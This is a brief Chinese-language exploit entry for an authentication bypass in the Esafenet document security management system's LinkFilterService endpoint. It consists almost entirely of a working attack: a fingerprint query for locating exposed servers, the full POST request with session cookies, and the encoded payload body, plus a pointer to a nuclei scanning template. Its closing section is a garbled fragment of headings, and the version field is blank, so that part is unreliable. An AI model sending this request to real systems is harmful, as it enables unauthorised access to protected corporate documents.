# 亿赛通电子文档安全管理系统LinkFilterService存在身份认证绕过漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/LinkFilterService HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: JSESSIONID=BCC78770D02EC6AB78EA995E2555A2C1; JSESSIONID=C64DC678312F69EFCDADCC74…`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 98`

**请求体 / payload**
```
path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB

nuclei脚本\
\[亿赛通电子文档安全管理系统-linkfilterservice-逻辑漏洞.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 亿赛通电子文档安全管理系统LinkFilterService存在身份认证绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统